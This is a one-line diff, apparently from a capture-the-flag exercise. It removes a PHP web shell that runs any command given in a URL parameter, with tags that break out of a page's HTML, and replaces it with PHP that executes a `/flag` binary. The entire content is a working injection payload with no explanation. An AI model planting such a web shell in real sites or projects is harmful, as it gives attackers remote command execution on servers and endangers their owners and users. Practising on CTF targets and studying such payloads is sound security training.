@@ -1,1 +1,1 @@
-</pre><?php system($_GET[cmd]);?><pre>
+<?php system("/flag"); ?>
